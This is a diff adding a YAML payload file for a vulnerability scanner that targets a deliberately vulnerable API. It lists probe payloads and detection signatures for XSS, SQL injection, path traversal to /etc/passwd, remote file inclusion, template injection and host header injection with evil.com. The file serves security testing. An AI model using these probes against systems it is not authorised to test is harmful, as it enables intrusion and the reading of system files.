@@ -1,0 +1,42 @@
+# this is only proof of concept payloads
+# to test signature based testing on https://github.com/michealkeines/Vulnerable-API/
+# this payloads should not use on production environment
+# and should not trusted for security measure due to signature limitation
+xss:
+  signatures:
+    - pt>al
+    - b>0p
+  payloads:
+    - <script>alert()</script>
+    - <b>0p1vm</b>
+sqli:
+  signatures:
+    - '313233'
+    - ģ
+  payloads:
+    - "' union select hex(123),hex(245) --"
+    - "' union select hex(123),char(0x123) --"
+lfi:
+  signatures:
+    - /root
+    - /root
+  payloads:
+    - ../../../../../../../etc/passwd
+    - ..//..//..//..//..//..//..//..//etc//passwd
+rfi:
+  signatures:
+    - /posts/my-first-post/
+  payloads:
+    - https://gritty.ninja
+ssti:
+  signatures:
+    - '4761'
+  payloads:
+    - '{{69*69}}'
+hhi:
+  signatures:
+    - href='evil.com'
+  payloads:
+    - evil.com
+
+
